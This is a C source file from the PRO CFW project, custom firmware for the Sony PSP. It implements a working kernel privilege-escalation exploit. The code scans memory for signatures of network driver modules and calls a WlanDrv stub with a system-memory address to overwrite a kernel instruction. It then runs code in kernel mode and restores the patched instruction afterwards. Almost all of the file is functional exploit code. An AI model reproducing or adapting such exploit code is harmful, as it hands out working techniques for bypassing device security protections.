/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <pspumd.h>
#include <module2.h>
#include <lflash0.h>
#include <macros.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include "kxploit.h"
#include "libs/debug/graphics.h"
#include "loader/encLoader/encryptloader.h"

extern FunctionTable *g_tbl;

int (* WlanDrv_lib_B5E7B187)(void) = NULL;
int (* WlanDrv_lib_51B0BBB8)(int, int, int, void *) = NULL;

// Find WlanDrv_lib_B5E7B187 at pspnet_apctl.prx
void * FindWlanDrv_lib_B5E7B187(void)
{
	// Search Start Position
	unsigned int * start = (unsigned int *)GAME_TEXT;
	
	// Search Force End Position
	unsigned int * end = (unsigned int *)(USER_BASE + USER_SIZE);
	
	// Current Position in RAM
	unsigned int * p = start;
	
	// Scan Memory
	for(; p < end - 8; p += 64)
	{
		// Found pspnet_apctl.prx Text Address
		if (*p == 0x27BDFFF0 && \
				*(p+1) == 0xAFB00000 && \
				*(p+2) == 0x00A0C021 && \
				*(p+3) == 0x00808021 && \
				*(p+4) == 0x00C07821 && \
				*(p+6) == 0x00E07021 && \
				*(p+7) == 0x8C820000 && \
				*(p+8) == 0x248C0008
				)
			break;
	}
	
	// Didn't find it... :(
	if(p >= end - 8)
		return NULL;
	
	// Calculate WlanDrv_lib_B5E7B187 Stub Address
	p += WLANDRV_LIB_B5E7B187 / 4;
	
	// Return it. :D
	return p;
}

// Find WlanDrv_lib_51B0BBB8
void * FindWlanDrv_lib_51B0BBB8(void)
{
	// Search Start Position
	unsigned int * start = (unsigned int *)GAME_TEXT;
	
	// Search Force End Position
	unsigned int * end = (unsigned int *)(USER_BASE + USER_SIZE);
	
	// Current Position in RAM
	unsigned int * p = start;
	
	// Scan Memory
	for(; p < end - 12; p += 64)
	{
		// Found pspnet_inet.prx Text Address
		if (*(p+1) == 0x7C8B3E00 && \
				*(p+2) == 0x7D624884 && \
				*(p+4) == 0x7C8A3C00 && \
				*(p+5) == 0x7D424884 && \
				*(p+7) == 0x7C893A00 && \
				*(p+8) == 0x7D224884 && \
				*(p+10) == 0x7C824884 && \
				*(p+12) == 0x7D6A7A04
				)
			break;
	}
	
	// Didn't find it... :(
	if(p >= end - 12)
		return NULL;
	
	
	// Calculate WlanDrv_lib_51B0BBB8 Stub Address
	p += WLANDRV_LIB_51B0BBB8 / 4;
	
	// Return it. :D
	return p;
}

// Load required Libraries for WlanDrv_lib_B5E7B187 & WlanDrv_lib_51B0BBB8
int stubScanner(void)
{
	if (WlanDrv_lib_B5E7B187 != NULL && WlanDrv_lib_51B0BBB8 != NULL)
		return 0;

	#ifdef USE_GAME_UTILITY_LOAD_MODULE
	
	// Load Modules via sceUtilityLoadModule (if available)
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);	// 0x100
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_ADHOC);	// 0x101
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);	// 0x101

	#else
	
	#ifdef USE_GAME_UTILITY_LOAD_NET_MODULE
	
	// Load Modules via sceUtilityLoadNetModule (if available)
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_COMMON);	// 1
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_ADHOC);	// 2
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_INET);	// 2
	
	#endif
	
	#endif

	WlanDrv_lib_B5E7B187 = FindWlanDrv_lib_B5E7B187();

	if (WlanDrv_lib_B5E7B187 == NULL)
		return -1;

	WlanDrv_lib_51B0BBB8 = FindWlanDrv_lib_51B0BBB8();

	if (WlanDrv_lib_51B0BBB8 == NULL)
		return -1;

	return 0;
}

int doExploit(void)
{
	unsigned char *sysmemAddr = (unsigned char *)SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR + 4;
	int ret;

	ret = WlanDrv_lib_B5E7B187();
	ret = WlanDrv_lib_51B0BBB8(0, 0, 0, sysmemAddr);

	return 0;
}

int executeKernelVFPU(SceSize args, void *argp)
{
	g_tbl->KernelLibcTime(0, KERNELIFY(kernelContentFunction), 0, 0, 0);

	return 0;
}

void executeKernel(void)
{
	SceUID thid;
	int ret;

	thid = g_tbl->KernelCreateThread("vfpu", &executeKernelVFPU, 0x18, 0x1000, PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU , NULL);
	ret = g_tbl->KernelStartThread(thid, 0, NULL);
	ret = g_tbl->KernelWaitThreadEnd(thid, NULL);
}

void repairInstruction(void)
{
	_sw(0x8C654384, SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR);
}
